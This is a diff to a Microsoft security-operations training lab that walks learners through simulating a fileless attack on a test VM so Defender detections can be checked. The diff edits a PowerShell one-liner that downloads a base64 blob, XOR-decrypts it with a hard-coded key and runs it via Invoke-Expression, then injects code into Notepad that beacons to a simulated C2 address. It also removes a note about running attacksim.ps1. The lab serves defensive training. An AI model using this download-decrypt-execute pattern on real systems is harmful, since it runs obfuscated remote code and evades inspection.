@@ -94,19 +94,10 @@ In this task, you will simulate an attack on the WIN1 virtual machine and verify
     ```PowerShell
     [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
     $xor = [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection');
-    $base64String = (Invoke-WebRequest -URI "https://raw.githubusercontent.com/MicrosoftLearning/SC-200T00A-Microsoft-Security-Operations-Analyst/refs/heads/master/Allfiles/MTP_Fileless_Recon.txt" -UseBasicParsing).Content;Try{ $contentBytes = [System.Convert]::FromBase64String($base64String) } Catch { $contentBytes = [System.Convert]::FromBase64String($base64String.Substring(3)) };$i = 0;
+    $base64String = (Invoke-WebRequest -URI "https://raw.githubusercontent.com/MicrosoftLearning/SC-200T00A-Microsoft-Security-Operations-Analyst/refs/heads/master/Allfiles/recon.txt" -UseBasicParsing).Content;Try{ $contentBytes = [System.Convert]::FromBase64String($base64String) } Catch { $contentBytes = [System.Convert]::FromBase64String($base64String.Substring(3)) };$i = 0;
     $decryptedBytes = @();$contentBytes.foreach{ $decryptedBytes += $_ -bxor $xor[$i];
     $i++; if ($i -eq $xor.Length) {$i = 0} }; Invoke-Expression ([System.Text.Encoding]::UTF8.GetString($decryptedBytes))
     ```
-
-    >**Note:** If you encounter errors (in red) while running the script, open the Notepad app and paste the script into a blank file. Ensure that *word wrap* is enabled in Notepad. Then, copy and execute each line of the script separately in PowerShell.  
-    Additionally, a PowerShell script (*attacksim.ps1*) was included in the files downloaded at the beginning of the labs. To run the script, open **Windows PowerShell (Admin)**, navigate to the *\Users\Admin\Desktop\Allfiles* folder, and enter:  
-
-    ```powershell
-    .\attacksim.ps1
-    ```
-
-   Press **Enter** to execute it.
 
 1. The script will produce several lines of output and a message that it *Failed to resolve Domain Controllers in the domain*. A few seconds later, the *Notepad* app will open. A simulated attack code will be injected into Notepad. Keep the automatically generated Notepad instance open to experience the full scenario. The simulated attack code will attempt to communicate to an external IP address (simulating a C2 server).
 
